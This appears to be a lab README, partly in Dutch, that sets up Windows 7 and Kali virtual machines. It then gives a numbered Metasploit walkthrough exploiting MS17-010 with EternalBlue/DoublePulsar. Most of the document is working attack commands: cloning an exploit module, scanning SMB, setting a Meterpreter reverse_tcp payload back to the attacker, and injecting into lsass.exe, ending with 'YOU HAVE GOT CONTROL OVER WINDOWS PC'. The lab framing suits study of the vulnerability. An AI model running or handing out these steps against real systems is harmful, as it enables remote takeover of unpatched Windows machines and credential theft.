# SETUP
1) Run "Setup Script"
	- make sure Kali-2023.4-64bit is unzipped so the folder 64bit is accessible in the root
	- make sure the windows iso file is accessible in the root
	
# WINDOWS VM

1) Installeer Guest Additions op Windows
	- Open Computer - CD Drive (E:) - vboxadditions - VBoxWindowsAdditions.exe
	- Herstart VM

2) Run "Transfer To Windows VM"

3) Op de Windows VM, run de bat file "post-install-windows-7" die op het bureaublad staat

4) Open CMD en run 'ipconfig'. Noteer het IPv4 Address

# KALI VM

1: ```sudo apt-get update```

2: ```git clone https://github.com/w0rtw0rt/EternalBlue```

3: ```msfconsole```

4: ```exit```

5: ```sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/eternalblue-doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb```

6: ```sudo dpkg --add-architecture i386```

7: ```sudo apt-get install libwine (of gewoon wine?)```

8: ```sudo mkdir /root/.wine```

9: ```sudo mkdir /root/.wine/c_drive```

10: ```sudo metasploit```

11: ```use auxiliary/scanner/smb/smb_ms17_010```

12: ```set RHOSTS <Windows IP>```

13: ```run```

14: ```use payload/windows/x64/meterpreter/reverse_tcp```

15: ```set LHOST <Kali IP>```

16: ```use exploit/windows/smb/eternalblue_doublepulsar```

17: ```set payload payload/windows/x64/meterpreter/reverse_tcp```

18: ```set TARGET 8```

19: ```set RHOSTS <windows ip>```

20: ```set LHOST <kali ip>```

21: ```set TARGETARCHITECTURE x64```

22: ```set PROCESSINJECT lsass.exe```

23: ```set DOUBLEPULSARPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```

24: ```set ETERNALBLUEPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```

25: ```set WINEPATH /home/osboxes/.wine/drive_c/```

26: ```run```

YOU HAVE GOT CONTROL OVER WINDOWS PC
